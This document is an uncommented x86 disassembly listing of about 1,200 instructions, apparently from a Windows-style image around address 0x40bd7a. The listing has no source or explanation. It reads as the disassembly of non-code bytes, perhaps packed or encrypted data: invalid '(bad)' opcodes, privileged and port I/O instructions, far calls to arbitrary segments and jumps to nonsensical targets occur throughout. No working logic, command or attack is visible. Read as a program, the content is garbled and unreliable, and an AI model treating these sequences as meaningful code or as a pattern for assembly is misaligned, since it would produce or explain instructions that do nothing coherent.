  40bd7a:	or     ah,BYTE PTR [ebx-0x74af1452]
  40bd80:	mov    WORD PTR [edx+0xd],gs
  40bd83:	xchg   ebx,ecx
  40bd85:	jp     0x40bd41
  40bd87:	jne    0x40bd9e
  40bd89:	sbb    dh,BYTE PTR es:0xccc33132
  40bd90:	fild   QWORD PTR ds:0x1175087d
  40bd96:	xchg   ebx,eax
  40bd97:	xor    al,0x79
  40bd99:	mov    ch,0x57
  40bd9b:	adc    eax,0xcb8bbb8e
  40bda0:	dec    edx
  40bda1:	scas   al,BYTE PTR es:[edi]
  40bda2:	adc    DWORD PTR [ebx+0x28eae855],ecx
  40bda8:	dec    ebx
  40bda9:	ret    0x2bbc
  40bdac:	fdecstp 
  40bdae:	std    
  40bdaf:	add    ecx,ecx
  40bdb1:	mov    dl,0xa5
  40bdb3:	pop    eax
  40bdb4:	(bad)  [ebp+0x49]
  40bdb7:	nop
  40bdb8:	or     ecx,DWORD PTR [ebx-0x20]
  40bdbb:	loopne 0x40bde3
  40bdbd:	inc    eax
  40bdbe:	jo     0x40bd92
  40bdc0:	jb     0x40bdfa
  40bdc2:	pop    ecx
  40bdc3:	scas   ax,WORD PTR es:[edi]
  40bdc5:	sbb    DWORD PTR [edi-0x5d],0xffffffba
  40bdc9:	push   edi
  40bdca:	out    dx,al
  40bdcb:	in     al,0xa1
  40bdcd:	push   eax
  40bdce:	push   ebp
  40bdcf:	or     eax,0x7fcadb35
  40bdd4:	and    dl,BYTE PTR [eax+0x21701ef7]
  40bdda:	sbb    edi,edx
  40bddc:	dec    edx
  40bddd:	cmp    edx,ebp
  40bddf:	dec    ebx
  40bde0:	mov    ds,ebp
  40bde2:	and    cl,BYTE PTR ds:0xf1d16e3e
  40bde8:	pop    es
  40bde9:	lods   eax,DWORD PTR ds:[esi]
  40bdea:	dec    ebx
  40bdeb:	xchg   esi,eax
  40bdec:	and    eax,0xde933e68
  40bdf1:	jecxz  0x40be54
  40bdf3:	inc    ebp
  40bdf4:	lods   al,BYTE PTR ds:[esi]
  40bdf5:	cmp    edx,DWORD PTR [edx+0x5]
  40bdf8:	idiv   al
  40bdfa:	dec    ecx
  40bdfb:	mov    al,gs:0xf3979b04
  40be01:	or     eax,esi
  40be03:	jecxz  0x40be1b
  40be05:	adc    dl,BYTE PTR ds:0xfa873271
  40be0b:	mov    ebx,0xd0be1dff
  40be10:	fs daa 
  40be12:	xor    eax,0xa171d5f7
  40be17:	fwait
  40be18:	(bad)  
  40be19:	icebp  
  40be1a:	mov    edi,0x4a0d9efc
  40be1f:	ret    0x5d25
  40be22:	jle    0x133badf4
  40be28:	xlat   BYTE PTR ds:[ebx]
  40be29:	hlt    
  40be2a:	mov    ah,0xc7
  40be2c:	or     DWORD PTR [eax-0x5557dd38],eax
  40be32:	add    DWORD PTR [ebp+0x5a793485],ecx
  40be38:	in     al,0x78
  40be3a:	adc    eax,0x76acb3a
  40be3f:	aaa    
  40be40:	mov    ah,0xff
  40be42:	jbe    0x40bdeb
  40be44:	mov    ah,0xe6
  40be46:	xor    edi,0x5261218a
  40be4c:	xor    DWORD PTR [ecx+0x34],eax
  40be4f:	outs   dx,BYTE PTR ds:[esi]
  40be50:	das    
  40be51:	mov    ebx,0x7441a0bf
  40be56:	cs mov dh,0xe6
  40be59:	test   BYTE PTR [eax],al
  40be5b:	sub    eax,eax
  40be5d:	test   eax,edi
  40be5f:	pop    edi
  40be60:	sub    bl,BYTE PTR [ebx+eiz*1]
  40be63:	fucomip st,st(6)
  40be65:	imul   edx,DWORD PTR [edi],0xffffffc5
  40be68:	stos   BYTE PTR es:[edi],al
  40be69:	push   edx
  40be6a:	enter  0x3dc2,0xcf
  40be6e:	arpl   bp,dx
  40be70:	mov    al,ds:0x57e24f63
  40be75:	xchg   ebx,eax
  40be76:	xchg   ebp,eax
  40be77:	lea    esp,[edx+0x42b7bbf6]
  40be7d:	xchg   DWORD PTR [ecx],ebx
  40be7f:	push   edx
  40be80:	lahf   
  40be81:	ins    DWORD PTR es:[edi],dx
  40be82:	fwait
  40be83:	mov    BYTE PTR ds:0xb833cb8b,ch
  40be89:	and    ebp,edx
  40be8b:	mov    edx,ecx
  40be8d:	mov    ecx,0x11ffb49d
  40be92:	and    DWORD PTR [eax-0x5d575faf],ebp
  40be98:	rol    BYTE PTR [eax],cl
  40be9a:	sbb    al,0x3e
  40be9c:	jl     0x40bea6
  40be9e:	sbb    DWORD PTR [eax-0x28193293],edi
  40bea4:	jo     0x40be52
  40bea6:	popf   
  40bea7:	into   
  40bea8:	cmp    al,BYTE PTR [ebp+0x37]
  40beab:	mov    edi,0xc93fa4a7
  40beb0:	dec    edi
  40beb1:	stos   BYTE PTR es:[edi],al
  40beb2:	mov    ebx,0x8f8f93ec
  40beb7:	cli    
  40beb8:	mov    bl,0x63
  40beba:	adc    al,0x4d
  40bebc:	(bad)  
  40bebd:	add    DWORD PTR [ebx],ebp
  40bebf:	les    ebp,FWORD PTR [esi]
  40bec1:	cmp    ch,0xca
  40bec4:	loope  0x40be51
  40bec6:	mov    ch,0xb4
  40bec8:	shl    dl,cl
  40beca:	push   ebp
  40becb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40becc:	test   DWORD PTR [edx+ecx*2],esp
  40becf:	sbb    esp,edx
  40bed1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bed2:	push   esp
  40bed3:	daa    
  40bed4:	scas   al,BYTE PTR es:[edi]
  40bed5:	imul   ebx,DWORD PTR [ebx+0x35],0x7c
  40bed9:	cmp    esp,ecx
  40bedb:	adc    al,0x7c
  40bedd:	pop    ebp
  40bede:	adc    BYTE PTR [ebp+esi*1-0xc92e86e],ah
  40bee5:	xchg   ebx,eax
  40bee6:	mov    WORD PTR [edx-0x5805727],?
  40beec:	fild   QWORD PTR [ebx+ebp*2-0x45]
  40bef0:	sbb    DWORD PTR ds:0xa56e707e,edi
  40bef6:	imul   esi,DWORD PTR [ecx],0x27
  40bef9:	ds cli 
  40befb:	jnp    0x40bf34
  40befd:	mov    esi,0x2e3a4f96
  40bf02:	mov    ch,0x13
  40bf04:	imul   ebp,DWORD PTR [ecx-0x68d74af7],0x1c
  40bf0b:	jmp    0x87ab:0x72353fec
  40bf12:	test   DWORD PTR [ebx-0x16],ebp
  40bf15:	fstp   QWORD PTR [ebx]
  40bf17:	loope  0x40bf54
  40bf19:	mov    edi,0xe884626
  40bf1e:	mov    ch,0x79
  40bf20:	pusha  
  40bf21:	push   ss
  40bf22:	lds    ecx,FWORD PTR [esi+0x6c4a94a6]
  40bf28:	test   BYTE PTR [esi],0x82
  40bf2b:	dec    ebp
  40bf2c:	xor    ebp,esi
  40bf2e:	lds    ebp,FWORD PTR [esi+0x7b127767]
  40bf34:	sti    
  40bf35:	dec    esp
  40bf36:	in     al,0x6
  40bf38:	test   eax,0x2ee6d5ab
  40bf3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf3e:	shl    BYTE PTR ds:0xf49cfff1,0x4d
  40bf45:	popf   
  40bf46:	pop    es
  40bf47:	xor    eax,0x5d78636c
  40bf4c:	dec    ebx
  40bf4d:	call   0x1b2c:0x205ffac8
  40bf54:	cmp    BYTE PTR [edx+0x75ac0d78],0xe5
  40bf5b:	add    BYTE PTR ss:[ebx],0x95
  40bf5f:	or     al,0x55
  40bf61:	imul   esp,DWORD PTR [ecx-0x1bac402a],0xbc72aa99
  40bf6b:	mov    ah,0xce
  40bf6d:	je     0x40bf5c
  40bf6f:	addr16 mov dl,0x6a
  40bf72:	add    al,0x84
  40bf74:	(bad)  
  40bf76:	push   ss
  40bf77:	adc    ebp,0x69
  40bf7a:	lock or ch,BYTE PTR [eax]
  40bf7d:	push   0xe07b86a8
  40bf82:	cld    
  40bf83:	mov    ah,BYTE PTR [esi-0x67]
  40bf86:	(bad)  
  40bf88:	(bad)  
  40bf89:	mov    edi,0x24eaf24
  40bf8e:	inc    ebx
  40bf8f:	fist   DWORD PTR [ebp+0x7f5c5731]
  40bf95:	and    edi,DWORD PTR [esi]
  40bf97:	data16 sahf 
  40bf99:	addr16 out dx,eax
  40bf9b:	push   0x336e81a6
  40bfa0:	jb     0x40bf57
  40bfa2:	dec    esp
  40bfa3:	mov    gs,WORD PTR [edi+0x19360cba]
  40bfa9:	dec    esp
  40bfaa:	movnti DWORD PTR [esi],ebp
  40bfad:	shl    esi,1
  40bfaf:	jg     0x40bfdc
  40bfb1:	(bad)  
  40bfb2:	pop    ds
  40bfb3:	add    al,0x66
  40bfb5:	and    edx,ecx
  40bfb7:	adc    eax,0xbbec6e85
  40bfbc:	mov    ch,0x30
  40bfbe:	sub    edx,DWORD PTR [edi*1-0x31c7275a]
  40bfc5:	(bad)  
  40bfc6:	sbb    al,BYTE PTR [ecx+0x65804e0d]
  40bfcc:	xchg   ebx,eax
  40bfcd:	xchg   esi,eax
  40bfce:	sbb    BYTE PTR [ecx-0x27e2e206],dl
  40bfd4:	into   
  40bfd5:	loopne 0x40bfcd
  40bfd7:	arpl   WORD PTR [esi+0x7c],di
  40bfda:	mov    bl,0xd0
  40bfdc:	add    dh,cl
  40bfde:	dec    edi
  40bfdf:	dec    eax
  40bfe0:	jno    0x40c026
  40bfe2:	xor    dl,dl
  40bfe4:	jecxz  0x40bfbd
  40bfe6:	call   0xbc0c5233
  40bfeb:	scas   eax,DWORD PTR es:[edi]
  40bfec:	mov    al,ds:0x64b0cf66
  40bff1:	ss dec esp
  40bff3:	push   cs
  40bff4:	stos   BYTE PTR es:[edi],al
  40bff5:	sub    eax,0x1c4daacd
  40bffa:	inc    edi
  40bffb:	fst    QWORD PTR [esi]
  40bffd:	xlat   BYTE PTR ds:[ebx]
  40bffe:	sar    DWORD PTR [esi],0xd9
  40c001:	pop    ss
  40c002:	pop    esi
  40c003:	rol    edx,cl
  40c005:	and    ebp,DWORD PTR [ebx-0x49]
  40c008:	sbb    BYTE PTR [edx+ebp*8-0x10],ch
  40c00c:	jle    0x40bf95
  40c00e:	test   DWORD PTR [esi+edi*4-0x2c],ebp
  40c012:	add    al,0x46
  40c014:	sub    ah,dl
  40c016:	jmp    0x1a5c3aa9
  40c01b:	pop    ds
  40c01c:	leave  
  40c01d:	retf   0x56db
  40c020:	test   eax,0xe7fd8389
  40c025:	dec    eax
  40c026:	jns    0x40bfe9
  40c028:	inc    esi
  40c029:	lea    ecx,[eax+0x4c]
  40c02c:	int3   
  40c02d:	push   ss
  40c02e:	sub    ah,0x91
  40c031:	pop    es
  40c032:	xor    al,0x3c
  40c034:	stc    
  40c035:	mov    al,ds:0x2fdc883f
  40c03a:	aaa    
  40c03b:	push   ds
  40c03c:	xor    bh,0x20
  40c03f:	push   esp
  40c040:	outs   dx,DWORD PTR ds:[esi]
  40c041:	call   0xc32:0xb6f14830
  40c048:	fs (bad) 
  40c04a:	sbb    ebx,esp
  40c04c:	adc    edi,ebp
  40c04e:	mov    edx,esp
  40c050:	dec    esi
  40c051:	fdivr  QWORD PTR [esp+edx*4+0x744f96b6]
  40c058:	dec    esi
  40c059:	add    al,0xba
  40c05b:	mov    ah,0x19
  40c05d:	adc    DWORD PTR [edi-0x54e3440d],ebx
  40c063:	js     0x40c02c
  40c065:	jne    0x40c036
  40c067:	dec    ebp
  40c068:	inc    ecx
  40c069:	daa    
  40c06a:	ror    bh,1
  40c06c:	test   al,0x27
  40c06e:	cli    
  40c06f:	mov    ds:0x5123357f,eax
  40c074:	nop
  40c075:	shr    DWORD PTR [ecx+0x5a],cl
  40c078:	inc    edi
  40c079:	jl     0x40c08b
  40c07b:	sbb    DWORD PTR [esi],edx
  40c07d:	or     DWORD PTR [edx],edx
  40c07f:	push   edi
  40c080:	adc    ebp,DWORD PTR [edi+0x78]
  40c083:	xchg   DWORD PTR [ecx],eax
  40c085:	cwde   
  40c086:	sbb    eax,DWORD PTR [ebx+edi*1]
  40c089:	test   dh,dh
  40c08b:	and    cl,bh
  40c08d:	mov    ds:0x75ff2049,al
  40c092:	mov    dh,0x83
  40c094:	fldcw  WORD PTR [edi-0x7e3c057b]
  40c09a:	mov    ds:0x2c00a496,eax
  40c09f:	aam    0x61
  40c0a1:	mov    bh,0xc5
  40c0a3:	jp     0x40c06d
  40c0a5:	int    0xf0
  40c0a7:	ja     0x40c0aa
  40c0a9:	pop    esi
  40c0aa:	mov    eax,DWORD PTR [esi+0x17f7df04]
  40c0b0:	xchg   edi,eax
  40c0b1:	fwait
  40c0b2:	fwait
  40c0b3:	push   esi
  40c0b4:	sub    esp,DWORD PTR [edx-0x422abc74]
  40c0ba:	and    bh,dl
  40c0bc:	pop    ebx
  40c0bd:	jne    0x40c107
  40c0bf:	pop    eax
  40c0c0:	dec    ebp
  40c0c1:	add    esi,0xffffffc0
  40c0c4:	inc    edi
  40c0c5:	mov    bl,BYTE PTR [ebx]
  40c0c7:	cmp    al,0x90
  40c0c9:	cwde   
  40c0ca:	das    
  40c0cb:	(bad)  
  40c0cc:	cwde   
  40c0cd:	fnsave [esi*1-0x2b65b505]
  40c0d4:	add    eax,DWORD PTR [eax-0x47]
  40c0d7:	xlat   BYTE PTR ds:[ebx]
  40c0d8:	mov    edi,DWORD PTR [ecx-0x507c5c0e]
  40c0de:	adc    DWORD PTR [esi+0x25445c01],ebx
  40c0e4:	mov    ebx,0xa727ced5
  40c0e9:	in     eax,dx
  40c0ea:	mov    ecx,0x4a0c21fd
  40c0ef:	dec    esp
  40c0f0:	mov    ecx,0x8e1b217f
  40c0f5:	jns    0x40c09c
  40c0f7:	inc    ebx
  40c0f8:	lahf   
  40c0f9:	jmp    0x40c0d2
  40c0fb:	or     eax,0xf86b3dfc
  40c100:	sbb    DWORD PTR [edi-0x12],edi
  40c103:	clc    
  40c104:	fs mov ebp,0xdae57e85
  40c10a:	std    
  40c10b:	sub    ecx,DWORD PTR [ecx+0x5]
  40c10e:	adc    al,0xc9
  40c110:	mov    bl,0xba
  40c112:	and    dh,BYTE PTR [ebx-0xd]
  40c115:	jp     0x40c115
  40c117:	cdq    
  40c118:	jmp    0x644a5764
  40c11d:	xlat   BYTE PTR ds:[ebx]
  40c11e:	ret    0x42c7
  40c121:	and    eax,0x9e5881c
  40c126:	loopne 0x40c0ea
  40c128:	inc    edi
  40c129:	jb     0x40c18d
  40c12b:	cmp    bl,0xb6
  40c12e:	out    0x7,eax
  40c130:	xor    ecx,DWORD PTR [edi]
  40c132:	and    al,0xaa
  40c134:	adc    al,BYTE PTR [ebp+0x7f69ac51]
  40c13a:	mov    bh,0xda
  40c13c:	adc    al,0x19
  40c13e:	or     al,0xa7
  40c140:	shr    DWORD PTR [eax],cl
  40c142:	or     bh,BYTE PTR [edx+0x682c6e6a]
  40c148:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c149:	ja     0x40c154
  40c14b:	mov    edi,0xac55f7eb
  40c150:	loop   0x40c13d
  40c152:	inc    ecx
  40c153:	xchg   esi,eax
  40c154:	stc    
  40c155:	dec    ecx
  40c156:	pop    edx
  40c157:	loopne 0x40c0e3
  40c159:	leave  
  40c15a:	test   BYTE PTR [edx],bl
  40c15c:	jbe    0x40c1c1
  40c15e:	sub    BYTE PTR [ecx+0x3e],dl
  40c161:	div    DWORD PTR ds:0x8a8c8cd0
  40c167:	cmp    al,BYTE PTR [esi]
  40c169:	dec    ebp
  40c16a:	das    
  40c16b:	jns    0x40c158
  40c16d:	fstp   TBYTE PTR [edx+0xb]
  40c170:	xor    esp,DWORD PTR [edx+ecx*1-0x1afb33a4]
  40c177:	xor    DWORD PTR [esi-0xa],edi
  40c17a:	xor    bh,BYTE PTR [eax+0x70]
  40c17d:	popf   
  40c17e:	add    eax,0x59651fe3
  40c183:	dec    ebx
  40c184:	sbb    DWORD PTR [ebx+ebp*2],esp
  40c187:	pop    ecx
  40c188:	add    dh,bh
  40c18a:	add    eax,0xefccdc9a
  40c18f:	ret    0xd710
  40c192:	add    al,0x2b
  40c194:	pop    eax
  40c195:	arpl   WORD PTR [eax-0x57],sp
  40c198:	sub    BYTE PTR [eax],0x8f
  40c19b:	ins    BYTE PTR es:[edi],dx
  40c19c:	add    BYTE PTR [ebx],bh
  40c19e:	das    
  40c19f:	and    esi,DWORD PTR [ebp+edx*8-0x453ce4d]
  40c1a6:	sbb    bl,BYTE PTR [eax]
  40c1a8:	mov    bh,0x39
  40c1aa:	(bad)  
  40c1ab:	and    BYTE PTR [edx],bl
  40c1ad:	cmp    DWORD PTR [ebx+edi*1+0x607b4b55],edx
  40c1b4:	in     eax,dx
  40c1b5:	sbb    BYTE PTR [esi],0xa5
  40c1b8:	pop    esi
  40c1b9:	adc    bh,BYTE PTR [eax]
  40c1bb:	clc    
  40c1bc:	cld    
  40c1bd:	pop    edx
  40c1be:	push   esi
  40c1bf:	and    dh,BYTE PTR [edx+edx*8+0x58784843]
  40c1c6:	or     eax,0x9db3338f
  40c1cb:	(bad)  
  40c1cc:	add    edx,DWORD PTR [esi+0x23a4b56f]
  40c1d2:	mov    dh,0x77
  40c1d4:	push   ds
  40c1d5:	fsubr  DWORD PTR [esi]
  40c1d7:	sub    eax,esp
  40c1d9:	push   cs
  40c1da:	push   ecx
  40c1db:	pop    esp
  40c1dc:	inc    eax
  40c1dd:	push   es
  40c1de:	cmp    dl,bl
  40c1e0:	arpl   WORD PTR [edi+ebp*1],ax
  40c1e3:	ret    0x1da1
  40c1e6:	push   esi
  40c1e7:	jns    0x40c239
  40c1e9:	add    al,0x22
  40c1eb:	jo     0x40c204
  40c1ed:	mov    eax,0x327818a5
  40c1f2:	fdivr  QWORD PTR [esi+esi*1+0x71fab311]
  40c1f9:	adc    al,0xd
  40c1fb:	xor    al,0xc8
  40c1fd:	shl    DWORD PTR [eax-0x5f5f84c],cl
  40c203:	cmp    ebx,esi
  40c205:	in     eax,dx
  40c206:	jmp    0x40c1b6
  40c208:	push   ecx
  40c209:	test   BYTE PTR [ecx+0x4a],dh
  40c20c:	or     BYTE PTR [eax],dh
  40c20e:	mov    ch,0x69
  40c210:	addr16 icebp 
  40c212:	adc    al,0xf0
  40c214:	fnstenv [esi-0x65]
  40c217:	or     BYTE PTR [esi+0x63],dl
  40c21a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c21b:	or     dl,BYTE PTR [ecx-0x7d41a4d0]
  40c221:	mov    eax,esp
  40c223:	mov    ebx,0xa4e50a37
  40c228:	lock push eax
  40c22a:	add    eax,0x3219d7f0
  40c22f:	stc    
  40c230:	add    al,0x51
  40c232:	adc    ebx,DWORD PTR [edi-0x6b]
  40c235:	cmp    ax,0xb2f8
  40c239:	xor    DWORD PTR [ecx+ebx*8],eax
  40c23c:	inc    edx
  40c23d:	xchg   ebx,eax
  40c23e:	mov    bl,0xab
  40c240:	adc    DWORD PTR [esi-0x3e],0xa84687b2
  40c247:	in     eax,0x6
  40c249:	(bad)
  40c24d:	jo     0x40c244
  40c24f:	cdq    
  40c250:	xor    ebx,DWORD PTR [edx+ebp*8+0x64d7eb73]
  40c257:	pop    ebp
  40c258:	adc    DWORD PTR [esi-0x67],edi
  40c25b:	std    
  40c25c:	mov    ebx,0xacca279
  40c261:	test   DWORD PTR [eax+0x9],0xdefa4d90
  40c268:	(bad)  
  40c269:	jne    0x40c205
  40c26b:	push   edx
  40c26c:	aad    0xec
  40c26e:	push   es
  40c26f:	sti    
  40c270:	adc    DWORD PTR [eax],ecx
  40c272:	inc    esp
  40c273:	mov    dh,0x76
  40c275:	inc    ebp
  40c276:	shl    BYTE PTR [eax+ebx*1+0x1],0x57
  40c27b:	das    
  40c27c:	xchg   ebx,eax
  40c27d:	das    
  40c27e:	sar    BYTE PTR [esi],0xe7
  40c281:	adc    eax,0x15e43592
  40c286:	into   
  40c287:	addr16 icebp 
  40c289:	sbb    esi,DWORD PTR fs:[eax]
  40c28c:	pusha  
  40c28d:	stos   DWORD PTR es:[edi],eax
  40c28e:	dec    edi
  40c28f:	mov    cl,0xa7
  40c291:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c292:	pop    edi
  40c293:	sub    BYTE PTR [edi],0x9a
  40c296:	mov    ch,bh
  40c298:	in     al,dx
  40c299:	xor    bl,BYTE PTR [ebp-0x26977fe0]
  40c29f:	inc    edx
  40c2a0:	loopne 0x40c2a7
  40c2a2:	in     al,dx
  40c2a3:	retf   
  40c2a4:	xor    ch,BYTE PTR ds:0xd2e9cfaf
  40c2aa:	je     0x40c293
  40c2ac:	and    edi,ebp
  40c2ae:	aas    
  40c2af:	popa   
  40c2b0:	mov    ebp,0x327138e
  40c2b5:	mov    ebp,0xdcce2e77
  40c2ba:	mov    ebp,0xa3d7d6d1
  40c2bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2c0:	sbb    DWORD PTR [ebp+0x67],edx
  40c2c3:	addr16 push cs
  40c2c5:	jl     0x40c27c
  40c2c7:	pop    es
  40c2c8:	xchg   DWORD PTR [esp+edi*4],ebp
  40c2cb:	enter  0x44e7,0xcf
  40c2cf:	dec    edi
  40c2d0:	jle    0x40c341
  40c2d2:	loopne 0x40c2de
  40c2d4:	retf   0xf7f5
  40c2d7:	pusha  
  40c2d8:	fsub   DWORD PTR [esi]
  40c2da:	stc    
  40c2db:	mov    al,ds:0xae93c7e0
  40c2e0:	cmp    DWORD PTR [ebp+ecx*4+0xcdb4fe7],ecx
  40c2e7:	push   ebp
  40c2e8:	ins    DWORD PTR es:[edi],dx
  40c2e9:	fwait
  40c2ea:	cmp    edx,esi
  40c2ec:	push   ecx
  40c2ed:	inc    eax
  40c2ee:	jns    0x40c307
  40c2f0:	aas    
  40c2f1:	inc    eax
  40c2f2:	xchg   ch,ah
  40c2f4:	mov    ds:0xba73a0a5,al
  40c2f9:	or     bh,ch
  40c2fb:	je     0x40c365
  40c2fd:	xchg   esi,eax
  40c2fe:	outs   dx,DWORD PTR ds:[esi]
  40c2ff:	fsubr  DWORD PTR [esi+0x7c307c48]
  40c305:	push   eax
  40c306:	les    esp,FWORD PTR [edx-0x7fc475c5]
  40c30c:	mov    bh,0x93
  40c30e:	sub    BYTE PTR [esi+0x14c2672a],ah
  40c314:	xor    eax,0x5366ce3a
  40c319:	inc    edx
  40c31a:	jbe    0x40c2a8
  40c31c:	fst    DWORD PTR [esi+0x5dd2ea73]
  40c322:	and    ecx,DWORD PTR ds:0x4da486bf
  40c328:	leave  
  40c329:	test   BYTE PTR [esi+0x325f9a9f],bl
  40c32f:	jns    0x40c351
  40c331:	test   ebx,esp
  40c333:	pop    eax
  40c334:	mov    ah,0x8d
  40c336:	inc    ebx
  40c337:	pop    eax
  40c338:	int3   
  40c339:	fdivp  st(5),st
  40c33b:	cmp    ch,dh
  40c33d:	push   esi
  40c33e:	jae    0x40c2fe
  40c340:	iret   
  40c341:	xchg   esi,eax
  40c342:	push   ebp
  40c343:	and    DWORD PTR [edx-0x5d],esi
  40c346:	pop    esp
  40c347:	or     DWORD PTR [eax+0x73],ecx
  40c34a:	inc    ebp
  40c34b:	popa   
  40c34c:	mov    al,ds:0x1d4080b4
  40c351:	fcomp  QWORD PTR [ecx+0x44]
  40c354:	push   esp
  40c355:	nop
  40c356:	jns    0x40c386
  40c358:	mov    ebx,0x6ff8680
  40c35d:	cmp    DWORD PTR [edx-0x2d],esp
  40c360:	lods   eax,DWORD PTR ds:[esi]
  40c361:	cmp    cl,BYTE PTR [edi-0x2]
  40c364:	(bad)  
  40c365:	sbb    BYTE PTR [ecx+0x7d],ch
  40c368:	stos   WORD PTR es:[edi],ax
  40c36a:	(bad)  
  40c36b:	cvtps2pd xmm1,xmm6
  40c36e:	lea    ecx,[ebp+edx*4-0x4c]
  40c372:	sub    dh,BYTE PTR [edi-0x1a570e26]
  40c378:	(bad)  
  40c379:	cwde   
  40c37a:	jne    0x40c37b
  40c37c:	mov    BYTE PTR [eax-0x42ac4e62],ah
  40c382:	fucomip st,st(5)
  40c384:	retf   0x93a7
  40c387:	shr    BYTE PTR ds:0xa6e863b,0x4c
  40c38e:	imul   eax,esp,0xec87d757
  40c394:	retf   0x352
  40c397:	cmp    eax,0x891ed1c8
  40c39c:	in     al,dx
  40c39d:	aam    0xcb
  40c39f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3a0:	mov    ch,0xf9
  40c3a2:	fisttp QWORD PTR [ebx+edi*4]
  40c3a5:	ror    eax,1
  40c3a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3a8:	sbb    eax,0x69b9f7e
  40c3ad:	arpl   WORD PTR [edx+0x14],bp
  40c3b0:	xor    ebp,edi
  40c3b2:	test   al,ch
  40c3b4:	shl    DWORD PTR [ebx+0x762684bc],cl
  40c3ba:	mov    DWORD PTR [ebx+edi*1-0xa],0x63fc1723
  40c3c2:	sti    
  40c3c3:	jmp    0xb04a:0xcf4c8c83
  40c3ca:	mov    dh,0xd8
  40c3cc:	lods   eax,DWORD PTR ds:[esi]
  40c3cd:	fwait
  40c3ce:	lds    ebp,FWORD PTR [eax-0x72ad9279]
  40c3d4:	xlat   BYTE PTR ds:[ebx]
  40c3d5:	sahf   
  40c3d6:	sbb    bl,bh
  40c3d8:	xlat   BYTE PTR ds:[ebx]
  40c3d9:	mov    ebx,0x888e82b2
  40c3de:	adc    DWORD PTR [edi+0x71],0x39
  40c3e2:	push   ebx
  40c3e3:	cmp    DWORD PTR [ebx+0x2eea5291],esp
  40c3e9:	and    edx,DWORD PTR [esi-0x3501c012]
  40c3ef:	push   eax
  40c3f0:	mov    esp,0x52493dff
  40c3f5:	stc    
  40c3f6:	repz fwait
  40c3f8:	cli    
  40c3f9:	or     DWORD PTR [ebp-0x3a830ace],esp
  40c3ff:	adc    ebp,DWORD PTR [ebx]
  40c401:	imul   esi,DWORD PTR [edx+ebp*2+0x7ecca0fa],0x7
  40c409:	jge    0x40c3e6
  40c40b:	ins    DWORD PTR es:[edi],dx
  40c40c:	xor    al,0x80
  40c40e:	sti    
  40c40f:	adc    al,0xd
  40c411:	aas    
  40c412:	xchg   DWORD PTR [eax+0x14],ebp
  40c415:	xchg   edi,eax
  40c416:	cmp    edx,edx
  40c418:	les    esp,FWORD PTR [edi]
  40c41a:	mov    BYTE PTR [eax+0x51],bh
  40c41d:	jo     0x40c3a5
  40c41f:	ror    DWORD PTR [ebp-0x47ed6f9],cl
  40c425:	jge    0x40c3e7
  40c427:	mov    edx,0x46eac2c0
  40c42c:	adc    edi,DWORD PTR [ecx+esi*1+0x20]
  40c430:	add    bh,cl
  40c432:	out    0xce,al
  40c434:	sbb    BYTE PTR [ecx+0xd31243a],dh
  40c43a:	ret    0xfc6b
  40c43d:	push   edx
  40c43e:	call   0x62eb:0x3a85354a
  40c445:	in     eax,0xff
  40c447:	jne    0x40c482
  40c449:	pop    edx
  40c44a:	add    BYTE PTR [ecx+0x1e],0xe3
  40c44e:	cmp    edx,DWORD PTR fs:[edi+eax*8-0x7f]
  40c453:	ficomp WORD PTR ds:[ecx-0x1e19ecb9]
  40c45a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c45b:	call   0x9af9857f
  40c460:	(bad)  
  40c461:	pop    edx
  40c462:	imul   ebp,DWORD PTR [edi],0x9ea51b38
  40c468:	pop    es
  40c469:	stc    
  40c46a:	push   ss
  40c46b:	push   eax
  40c46c:	cmp    bh,BYTE PTR [ebx+0x2c]
  40c46f:	xchg   ebp,eax
  40c470:	mov    BYTE PTR [esi+0x2],dh
  40c473:	jg     0x40c40a
  40c475:	mov    bh,0xe3
  40c477:	fnstenv [ebp+edi*8+0x5501c32]
  40c47e:	imul   eax,DWORD PTR [ebp-0x21b9fcee],0xcd6c7896
  40c488:	sub    al,0xd5
  40c48a:	add    BYTE PTR [edi],dh
  40c48c:	lds    esp,FWORD PTR cs:[edi+0x32]
  40c490:	cwde   
  40c491:	jae    0x40c511
  40c493:	pop    eax
  40c494:	int3   
  40c495:	xchg   esi,eax
  40c496:	retf   0x2d56
  40c499:	push   es
  40c49a:	mov    esi,0x18e48da2
  40c49f:	mov    DWORD PTR [ebp+0x2957aabc],eax
  40c4a5:	and    esp,ebp
  40c4a7:	inc    ebp
  40c4a8:	jl     0x40c4b1
  40c4aa:	loopne 0x40c528
  40c4ac:	bound  eax,QWORD PTR [ebx+0xda8423d]
  40c4b2:	retf   0x25a4
  40c4b5:	dec    esp
  40c4b6:	xor    bl,BYTE PTR [bp+si]
  40c4b9:	mov    bh,0xec
  40c4bb:	popa   
  40c4bc:	test   DWORD PTR gs:[ecx+0x50],esp
  40c4c0:	aam    0xad
  40c4c2:	stos   DWORD PTR es:[edi],eax
  40c4c3:	add    BYTE PTR [ebp+0x6d],dl
  40c4c6:	dec    esi
  40c4c7:	in     eax,0x80
  40c4c9:	mov    BYTE PTR [ecx+ecx*4+0x40d14113],cl
  40c4d0:	jecxz  0x40c4e7
  40c4d2:	test   BYTE PTR [ecx-0x53eaea17],al
  40c4d8:	sti    
  40c4d9:	mov    ebx,0x8d9791c6
  40c4de:	jl     0x40c46b
  40c4e0:	mov    cl,0xe2
  40c4e2:	call   0x7f77c6d9
  40c4e7:	icebp  
  40c4e8:	scas   al,BYTE PTR es:[edi]
  40c4e9:	rcl    BYTE PTR [eax-0xc],1
  40c4ec:	pop    eax
  40c4ed:	dec    esp
  40c4ee:	mov    al,0xef
  40c4f0:	test   DWORD PTR [edi+0x1f07c5de],esp
  40c4f6:	mov    bh,0xf4
  40c4f8:	jge    0x40c4ce
  40c4fa:	sub    al,0x69
  40c4fc:	dec    esp
  40c4fd:	ds push eax
  40c4ff:	ins    DWORD PTR es:[edi],dx
  40c500:	xor    DWORD PTR [edx],ebx
  40c502:	cmp    ah,BYTE PTR [ecx]
